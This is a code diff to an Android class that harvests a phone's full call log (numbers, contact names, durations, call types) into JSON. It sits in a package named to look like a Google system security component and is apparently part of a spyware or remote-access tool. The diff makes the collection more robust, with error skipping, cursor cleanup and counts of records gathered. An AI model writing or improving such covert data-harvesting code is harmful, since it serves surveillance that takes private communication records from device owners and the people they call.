@@ -3,6 +3,7 @@ package com.google.android.sys.security;
 import android.database.Cursor;
 import android.net.Uri;
 import android.provider.CallLog;
+import android.util.Log;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -15,36 +16,60 @@ import org.json.JSONObject;
 public class CallsManager {
 
     public static JSONObject getCallsLogs(){
-
+        Cursor cur = null;
         try {
             JSONObject Calls = new JSONObject();
             JSONArray list = new JSONArray();
 
             Uri allCalls = Uri.parse("content://call_log/calls");
-            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(allCalls, null, null, null, null);
+            cur = MainService.getContextOfApplication().getContentResolver().query(allCalls, null, null, null, null);
 
-            while (cur.moveToNext()) {
-                JSONObject call = new JSONObject();
-                String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));// for  number
-                String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));// for name
-                String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));// for duration
-                int type = Integer.parseInt(cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE)));// for call type, Incoming or out going.
+            if (cur != null) {
+                while (cur.moveToNext()) {
+                    try {
+                        JSONObject call = new JSONObject();
+                        
+                        int numIndex = cur.getColumnIndex(CallLog.Calls.NUMBER);
+                        int nameIndex = cur.getColumnIndex(CallLog.Calls.CACHED_NAME);
+                        int durationIndex = cur.getColumnIndex(CallLog.Calls.DURATION);
+                        int typeIndex = cur.getColumnIndex(CallLog.Calls.TYPE);
+                        
+                        if (numIndex >= 0 && durationIndex >= 0 && typeIndex >= 0) {
+                            String num = cur.getString(numIndex);
+                            String name = nameIndex >= 0 ? cur.getString(nameIndex) : "Unknown";
+                            String duration = cur.getString(durationIndex);
+                            int type = Integer.parseInt(cur.getString(typeIndex));
 
-
-                call.put("phoneNo", num);
-                call.put("name", name);
-                call.put("duration", duration);
-                call.put("type", type);
-                list.put(call);
-
+                            call.put("phoneNo", num != null ? num : "Unknown");
+                            call.put("name", name != null ? name : "Unknown");
+                            call.put("duration", duration != null ? duration : "0");
+                            call.put("type", type);
+                            list.put(call);
+                        }
+                    } catch (Exception e) {
+                        // Skip this call log if error, continue with others
+                        Log.e("CallsManager", "Error reading individual call log", e);
+                    }
+                }
             }
+            
             Calls.put("callsList", list);
+            Log.d("CallsManager", "Collected " + list.length() + " call logs");
             return Calls;
-        } catch (JSONException e) {
-            e.printStackTrace();
+            
+        } catch (Exception e) {
+            Log.e("CallsManager", "Error reading call logs", e);
+            return null;
+        } finally {
+            // Always close cursor to prevent memory leak
+            if (cur != null) {
+                try {
+                    cur.close();
+                } catch (Exception e) {
+                    Log.e("CallsManager", "Error closing cursor", e);
+                }
+            }
         }
-        return null;
-
     }
 
 }
